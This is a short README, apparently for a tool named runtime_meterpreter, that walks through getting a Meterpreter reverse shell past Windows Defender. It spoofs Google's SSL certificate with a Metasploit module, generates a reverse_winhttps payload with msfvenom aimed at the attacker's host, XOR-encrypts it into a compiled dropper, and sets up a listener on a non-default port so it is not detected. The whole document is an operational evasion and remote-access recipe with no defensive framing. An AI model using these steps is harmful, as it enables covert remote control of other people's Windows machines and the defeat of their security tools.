# runtime_meterpreter

This is a way that today 10/10/2023, gets the meterpreter shellcode executed without Windows Defender detection at runtime and scantime.

1) generate a false SSL certificate for our meterpreter connection. We ll use a metasploit module (This module request a copy of the remote SSL certificate and creates a local (self.signed) version using the information from the remote version.)
   To do this:
      1) type msfconsole
      2) use auxiliary/gather/impersonate_ssl
      3) set RHOSTS www.google.com
      4) run
      5) save the path to the .pem file, it is your certificate (I file PEM vengono utilizzati per archiviare i certificati SSL e le chiavi private che vi sono associate)

2)generate your payload
    to do this:
        1) msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=<YOUR_IP> LPORT=<YOUR_PORT> HANDLERSSLCERTIFICATE=path_to_pem.pem- StagerVerifySSLCert=true -f raw -o meterpreter_winhttps.bin
        2)now XOR encrypt your payload with a custom key
        3)copy the cripted payload in the dropper
        4)compile your dropper.cpp simply by open Visual Studio console and do 'cl.exe dropper.cpp'

3)set up your listener in msfconsole
    to do this:
        1) use exploit/multi/handler
        2) set payload windows/x64/meterpreter/reverse_winhttps
        3) set HANDLERSSLCERTIFICATE path_to_pem.pem
        4) set LHOST <YOUR_IP>
        5) set LPORT <YOUR_PORT>   (avoid port 4444, it gets detected as it is the standard metasploit port)
        6) run

4) just execute the dropper.exe
  
